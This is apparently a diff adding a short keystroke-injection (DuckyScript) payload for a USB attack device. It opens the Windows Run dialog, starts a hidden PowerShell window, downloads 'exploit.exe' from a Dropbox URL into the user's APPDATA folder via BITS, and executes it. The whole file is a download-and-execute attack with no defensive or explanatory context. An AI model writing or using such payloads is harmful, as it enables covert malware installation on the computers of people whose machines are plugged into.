@@ -1,0 +1,5 @@
+
+GUI r
+DELAY 300
+STRING powershell -w 1 cd $env:APPDATA\Microsoft;import-module bitstransfer;start-bitstransfer -so "https://dl.dropboxusercontent.com/s/kj485dgjn6ncb/exploit.exe";start exploit.exe
+ENTER
